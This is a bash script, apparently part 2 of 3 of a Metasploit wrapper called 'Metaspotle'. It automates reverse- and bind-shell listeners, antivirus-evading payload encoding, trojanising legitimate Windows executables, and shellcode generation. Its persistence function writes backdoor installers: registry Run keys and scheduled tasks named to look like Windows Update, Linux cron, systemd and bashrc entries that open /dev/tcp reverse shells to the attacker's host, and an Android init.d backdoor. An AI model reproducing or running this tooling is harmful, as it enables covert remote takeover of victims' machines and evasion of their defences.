#!/bin/bash

#===============================================================================
# METASPOTLE - PART 2/3 - Listeners, Encoding, Injection, Persistence
#===============================================================================

#======= MULTI-HANDLER LISTENER =======
start_multi_handler() {
  clear; banner
  echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║         ${WHITE}MULTI-HANDLER LISTENER${CYAN}               ║${NC}"
  echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  default_ip=$(get_ip)
  read -p "$(echo -e ${CYAN}"[>] LHOST (default: $default_ip): "${NC})" L_HOST
  L_HOST=${L_HOST:-$default_ip}
  read -p "$(echo -e ${CYAN}"[>] LPORT (default: 4444): "${NC})" L_PORT
  L_PORT=${L_PORT:-4444}
  echo ""
  echo -e "${YELLOW}[?] Payload:${NC}"
  echo -e "  [1] android  [2] windows  [3] linux  [4] osx  [5] php  [6] python  [7] java  [8] ios  [9] custom"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ht
  case $ht in
    1) PAYLOAD="android/meterpreter/reverse_tcp" ;;
    2) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
    3) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
    4) PAYLOAD="osx/x64/meterpreter/reverse_tcp" ;;
    5) PAYLOAD="php/reverse_php" ;;
    6) PAYLOAD="python/meterpreter/reverse_tcp" ;;
    7) PAYLOAD="java/meterpreter/reverse_tcp" ;;
    8) PAYLOAD="apple_ios/aarch64/meterpreter/reverse_tcp" ;;
    9) read -p "$(echo -e ${CYAN}"[>] Custom: "${NC})" PAYLOAD ;;
    *) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
  esac
  echo ""
  echo -e "${GREEN}[+] LHOST: $L_HOST | LPORT: $L_PORT | $PAYLOAD${NC}"
  echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
  echo -e "${RED}║  ${WHITE}Waiting for target... Ctrl+C to stop${RED}     ║${NC}"
  echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
  echo ""
  RC_FILE="$HOME/.metaspotle/handler_${L_PORT}.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $L_HOST
set LPORT $L_PORT
set ExitOnSession false
set SessionTimeout 0
set WaitForSession true
exploit -j -z
EOF
  sleep 1; msfconsole -q -r "$RC_FILE"
  echo -e "${YELLOW}[?] Open msfconsole? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ans
  [[ "$ans" == "y" ]] && msfconsole -q
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= BIND SHELL LISTENER =======
start_bind_handler() {
  clear; banner
  echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║         ${WHITE}BIND SHELL LISTENER${CYAN}                  ║${NC}"
  echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  read -p "$(echo -e ${CYAN}"[>] RHOST: "${NC})" RHOST
  read -p "$(echo -e ${CYAN}"[>] RPORT (default: 4444): "${NC})" RPORT
  RPORT=${RPORT:-4444}
  echo -e "${YELLOW}[?] Target OS: [1] Windows [2] Linux${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" os_type
  PAYLOAD="linux/x64/shell_bind_tcp"; [ "$os_type" == "1" ] && PAYLOAD="windows/x64/shell_bind_tcp"
  echo -e "${GREEN}[+] Connecting to $RHOST:$RPORT${NC}"
  RC_FILE="$HOME/.metaspotle/bind_${RPORT}.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set RHOST $RHOST
set RPORT $RPORT
set ExitOnSession false
exploit -j -z
EOF
  sleep 1; msfconsole -q -r "$RC_FILE"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= ENCODE PAYLOAD =======
encode_payload() {
  clear; banner; echo -e "${YELLOW}[*] Payload Encoding & AV Evasion${NC}"
  echo ""
  echo -e "${YELLOW}[?] Base payload: [1] Win x64 [2] Win x86 [3] Linux x64 [4] Custom${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" base_p
  case $base_p in
    1) B="windows/x64/meterpreter/reverse_tcp"; F="exe" ;;
    2) B="windows/meterpreter/reverse_tcp"; F="exe" ;;
    3) B="linux/x64/meterpreter/reverse_tcp"; F="elf" ;;
    4) read -p "$(echo -e ${CYAN}"[>] Base: "${NC})" B; read -p "$(echo -e ${CYAN}"[>] Format: "${NC})" F ;;
    *) B="windows/x64/meterpreter/reverse_tcp"; F="exe" ;;
  esac
  get_lhost_lport
  echo -e "${YELLOW}[?] Iterations (1-20, default 5):${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ITER; ITER=${ITER:-5}
  echo -e "${YELLOW}[?] Encoder: [1] shikata_ga_nai [2] xor${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" enc
  ENC="x86/shikata_ga_nai"; [ "$enc" == "2" ] && ENC="x86/xor"
  FILENAME="encoded_$(date +%s).$F"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  echo -e "${YELLOW}[*] Encoding ${ITER}x with $ENC...${NC}"
  msfvenom -p $B LHOST=$LHOST LPORT=$LPORT -e $ENC -i $ITER -f $F -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "ENCODED" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${YELLOW}[!] Encoding evades signature-based AV, not behavioral${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= INJECT INTO EXE =======
inject_payload() {
  clear; banner; echo -e "${BLUE}[*] Inject Payload into Legitimate EXE${NC}"
  echo ""
  read -p "$(echo -e ${CYAN}"[>] Path to legit .exe: "${NC})" LEGIT_EXE
  [ ! -f "$LEGIT_EXE" ] && echo -e "${RED}[!] Not found${NC}" && read -p "$(echo -e ${DIM}"Press [Enter]...")" && return
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  A="windows"; [ "$arch" == "2" ] && A="windows/x64"
  FILENAME="injected_$(basename $LEGIT_EXE)"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -x "$LEGIT_EXE" -k -f exe -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "INJECTED" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${GREEN}[+] Original program still works normally${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= PERSISTENT BACKDOOR =======
persistent_backdoor() {
  clear; banner; echo -e "${RED}[*] Create Persistent Backdoor${NC}"
  echo ""
  get_lhost_lport
  echo -e "${YELLOW}[?] Target: [1] Windows [2] Linux [3] Android${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" plat
  FILENAME="persistent_$(date +%s).sh"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  case $plat in
    1)
      EXE_FILE="$PAYLOAD_DIR/backdoor_$(date +%s).exe"
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$EXE_FILE" 2>/dev/null
      cat > "$OUTPUT" << EOF
@echo off
copy "$EXE_FILE" C:\Windows\backdoor.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdater /t REG_SZ /d "C:\Windows\backdoor.exe" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdater /t REG_SZ /d "C:\Windows\backdoor.exe" /f
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\backdoor.exe" /sc onlogon /f
echo Backdoor installed
EOF
      echo -e "${GREEN}[OK] EXE + persistence script created${NC}"
      log_payload "PERSIST-WIN" "$LHOST" "$LPORT" "backdoor_*.exe" ""
      ;;
    2)
      cat > "$OUTPUT" << EOF
#!/bin/bash
echo "*/5 * * * * root bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" >> /etc/crontab
cat > /etc/systemd/system/update.service << 'SERV'
[Unit]
Description=Update
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
SERV
systemctl enable update.service && systemctl start update.service
echo "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &'" >> /etc/bash.bashrc
echo "Persistence installed"
EOF
      chmod +x "$OUTPUT"
      echo -e "${GREEN}[OK] Linux persistence script created${NC}"
      log_payload "PERSIST-LINUX" "$LHOST" "$LPORT" "$FILENAME" ""
      ;;
    3)
      cat > "$OUTPUT" << EOF
#!/system/bin/sh
cp /data/local/tmp/payload.apk /system/app/SystemUpdate.apk
chmod 644 /system/app/SystemUpdate.apk
cat > /system/etc/init.d/99backdoor << 'INIT'
#!/system/bin/sh
am startservice -n com.metasploit.stage/.MainService
sleep 30
am startservice -n com.metasploit.stage/.MainService
INIT
chmod 755 /system/etc/init.d/99backdoor
echo "Android persistence installed (root required)"
EOF
      echo -e "${GREEN}[OK] Android persistence script created${NC}"
      log_payload "PERSIST-ANDROID" "$LHOST" "$LPORT" "$FILENAME" ""
      ;;
  esac
  echo -e "${BOLD}Output:${NC} $OUTPUT"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= GENERATE SHELLCODE =======
gen_shellcode() {
  clear; banner; echo -e "${BLUE}[*] Generate Shellcode${NC}"
  echo ""
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  echo -e "${YELLOW}[?] Format: [1] C [2] Python [3] Ruby [4] Base64 [5] Hex [6] Raw${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" fmt
  A="linux/x86"; [ "$arch" == "2" ] && A="linux/x64"
  case $fmt in
    1) F="c"; EXT="c" ;; 2) F="py"; EXT="py" ;; 3) F="rb"; EXT="rb" ;;
    4) F="base64"; EXT="b64" ;; 5) F="hex"; EXT="hex" ;; 6) F="raw"; EXT="bin" ;;
    *) F="c"; EXT="c" ;;
  esac
  FILENAME="shellcode_$(date +%s).$EXT"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f $F -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "SHELLCODE" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Length: $(wc -c < $OUTPUT) bytes${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

export -f start_multi_handler start_bind_handler encode_payload inject_payload persistent_backdoor gen_shellcode
